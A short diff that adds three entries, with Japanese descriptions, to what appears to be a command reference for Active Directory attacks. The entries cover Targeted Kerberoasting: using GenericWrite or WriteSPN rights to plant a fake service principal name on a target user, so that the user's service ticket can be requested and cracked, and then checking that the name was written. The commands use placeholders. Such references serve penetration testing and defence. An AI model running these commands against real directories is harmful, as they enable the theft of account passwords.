@@ -1,0 +1,3 @@
+# GenericWrite・WriteSPN で対象に SPN を書く・確かめる（値・表示名・説明。Targeted Kerberoasting）
+set object -v 'fake_spn/<target_user>' '<target_user>' servicePrincipalName	SPN を書く	対象に偽の SPN を書く。書いたら Kerberoasting で対象の TGS を取って割るため
+get object '<target_user>' --attr servicePrincipalName	SPN を見る	SPN が書けたかを確かめる（servicePrincipalName を読む）
